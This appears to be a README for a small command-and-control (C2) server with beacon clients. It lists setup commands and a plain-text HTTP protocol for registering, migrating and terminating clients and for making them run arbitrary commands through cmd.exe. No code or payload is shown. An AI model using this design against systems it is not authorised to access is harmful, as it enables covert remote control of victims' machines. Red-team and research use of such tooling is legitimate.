# c2

Simplistic C2 infra using fairly dumb beacon clients. 

## Usage

```
python3 -m pip install -r requirements.txt
gunicorn -w 1 --threads 4 server:app -b 127.0.0.1:8000 --error-logfile server.log --daemon
```

## Server Specification

```
POST / HTTP/1.1
host: proxy-to-c2

KEY:COMMAND:CLIENT:PARAMETERS

HTTP/1.1 200 OK
```

- `KEY`: Random identifier generated for server ie. `UqkxAols`.
- `COMMAND`:
    - `L`: List registered clients.
    - `R`: Register a new client.
    - `U`: Unregister a client.
    - `I`: Display command/output information for client.
    - `N`: Migrate client to C2 servers in comma delimited list `PARAMETERS`.
    - `C`: Request client to execute command in `PARAMETERS`.
    - `T`: Request client to terminate.
- `CLIENT`: Random identifier of target client.
- `PARAMETERS`: Parameters required by command or nothing.

## Client Specification

```
POST / HTTP/1.1
host: proxy-to-c2

KEY:OUTPUT

HTTP/1.1 200 OK

COMMAND:PARAMETERS
```

- `KEY`: Random identifier generated for client ie. `KUqTUimL`.
- `OUTPUT`: Output generated by last command or nothing.
- `COMMAND`:
    - `T`: Terminate this client.
    - `N`: Use C2 servers in comma delimited list `PARAMETERS`.
    - `C`: Execute command ie. `cmd.exe /K <PARAMETERS>`.
- `PARAMETERS`: Parameters required by command or nothing.
